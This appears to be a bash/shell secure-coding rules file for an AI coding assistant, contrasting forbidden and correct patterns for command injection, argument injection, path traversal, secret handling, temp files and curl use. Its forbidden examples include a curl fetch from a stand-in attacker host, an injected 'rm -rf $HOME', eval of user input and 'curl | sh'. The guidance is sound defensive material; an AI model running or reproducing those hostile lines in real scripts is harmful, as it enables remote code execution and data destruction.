# Bash / Shell Security

> Auto-fires on every `*.sh`, `*.bash`, `*.zsh` file. Sister to
> `~/.claude/rules/common/security.md`. Standards: **OWASP Shell
> Injection Cheat Sheet**, **POSIX shell command-injection
> taxonomy**, **CWE-78 (OS Command Injection)**, **CWE-77 (Command
> Injection)**, **CWE-88 (Argument Injection)**.

## Core Principle

**Bash scripts run with the privileges of the caller — usually the
deploying engineer or CI runner. Treat every variable that
crosses a boundary as untrusted input. No `eval`; no
unsanitised command substitution; no SUID shell scripts; no
unsafe `IFS`; secrets from env / vault never from `ps`-visible
arguments.**

## OWASP — Bash specifics

### CWE-78 / CWE-77 — OS Command Injection

```bash
# FORBIDDEN — RCE
filename="$(curl http://attacker/payload)"
ls "$filename"   # injected: `; rm -rf $HOME`

# More obvious:
eval "ls $user_input"
```

```bash
# CORRECT — never interpolate user input into a command string
# Use array-style invocation
declare -a cmd=("ls" "$user_input")
"${cmd[@]}"

# OR — explicit allowlist
case "$user_input" in
    start|stop|status) systemctl "$user_input" myservice ;;
    *) log_error "unknown action"; exit 1 ;;
esac
```

### CWE-88 — Argument injection

```bash
# WRONG — leading `--` in user input
filename="--help"   # or "--delete"
rm "$filename"      # interpreted as flag

# CORRECT — use `--` to terminate options
rm -- "$filename"
```

### Path traversal

```bash
# WRONG — `..` escapes the base directory
cp "$base_dir/$user_path" /dest/

# CORRECT — realpath + prefix check
resolved="$(realpath -m "$base_dir/$user_path")"
case "$resolved" in
    "$base_dir"/*) cp "$resolved" /dest/ ;;
    *) log_error "path traversal attempt: $user_path"; exit 1 ;;
esac
```

### Secrets in argv

```bash
# FORBIDDEN — argv is visible via `ps`
mysql --password="hunter2" ...
curl -u "user:hunter2" ...

# CORRECT — env var (process-private)
MYSQL_PWD="$DB_PASSWORD" mysql ...
curl --netrc-file <(printf 'machine api.example.com login user password %s\n' "$API_TOKEN") ...

# OR — read from stdin
mysql --defaults-file=<(printf '[client]\npassword=%s\n' "$DB_PASSWORD") ...
```

### Temp file races

```bash
# FORBIDDEN — predictable name
tmp="/tmp/myscript-$$"

# CORRECT — mktemp creates with mode 0600
tmp="$(mktemp)"
trap 'rm -f "$tmp"' EXIT

# Temp dir
tmpdir="$(mktemp -d)"
trap 'rm -rf "$tmpdir"' EXIT
```

### `umask` for created files

```bash
# At the top of a script that writes secrets:
umask 077  # files created mode 0600
echo "$secret" > config.local
```

### Don't grant SUID to shell scripts

Linux ignores SUID on shell scripts by default (security
historical reason). NEVER set it via `chmod u+s script.sh`;
NEVER wrap a shell script in a SUID C wrapper. Use a real
program written in Go / Rust / C with proper capability
handling.

## Curl / wget hardening

```bash
# CORRECT — fail on HTTP error, follow redirects up to N, timeout
curl --fail \
     --silent \
     --show-error \
     --max-time 30 \
     --max-redirs 5 \
     --tlsv1.2 \
     --user-agent "myscript/1.0" \
     "https://api.example.com/path" \
     -o output.json

# Verify TLS — NEVER --insecure / -k in production
# If self-signed cert is genuinely needed, use --cacert path/to/ca.pem
```

```bash
# FORBIDDEN — `curl | sh` accepts whatever the server returns
curl https://example.com/install | sh

# CORRECT — download, verify, then execute
curl --fail --silent --show-error -o installer.sh "$URL"
echo "$EXPECTED_SHA256  installer.sh" | sha256sum --check --quiet
bash installer.sh
```

Per `~/.claude/rules/common/install-allowlist.md`.

## SSH / remote execution

```bash
# Quote remote command properly
ssh "$host" "ls /tmp/$file"        # $file expanded LOCALLY (correct)
ssh "$host" 'ls /tmp/$file'        # $file expanded REMOTELY (different
                                    #  meaning; intentional only when REMOTE_ENV)

# Quote arguments for remote shell
ssh "$host" "$(printf 'ls %q' "$file")"  # %q shell-escapes
```

## Logging — no secrets

```bash
# FORBIDDEN
log_info "logged in with token=$API_TOKEN"

# CORRECT
log_info "logged in (token sha256: $(printf '%s' "$API_TOKEN" | sha256sum | head -c 8))"
```

## Required tooling

```bash
shellcheck -S style script.sh
shfmt -d -i 4 script.sh
# Bandit-equivalent for shell:
gixy nginx_config.conf       # if shell controls nginx
checkov --framework dockerfile,kubernetes,helm  # IaC sister
```

For credential scanning in scripts:

```bash
gitleaks detect --source script.sh
trufflehog filesystem --no-update script.sh
```

## Cross-references

- `~/.claude/rules/common/security.md`
- `~/.claude/rules/common/secrets-management.md`
- `~/.claude/rules/common/install-allowlist.md`
- `~/.claude/rules/bash/no-discards.md`
- `~/.claude/rules/bash/coding-style.md`
- OWASP Shell Injection Cheat Sheet
- Bash Pitfalls (mywiki.wooledge.org/BashPitfalls)
- CWE-78 (cwe.mitre.org)
